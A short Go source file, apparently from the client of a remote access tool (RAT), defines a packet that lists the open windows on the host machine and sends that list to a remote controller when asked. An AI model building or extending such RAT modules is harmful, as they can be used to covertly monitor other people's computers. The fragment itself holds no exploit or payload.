package main

import (
	"rat/client/windows"
	"rat/shared"
)

type WindowsPacket struct {
	Windows []shared.Window `network:"send"`
}

func (packet WindowsPacket) Header() shared.PacketHeader {
	return shared.WindowsHeader
}

func (packet *WindowsPacket) Init() {
	windows.QueryWindows()

	packet.Windows = windows.Windows
}

func (packet WindowsPacket) OnReceive() error {
	Queue <- &WindowsPacket{}

	return nil
}
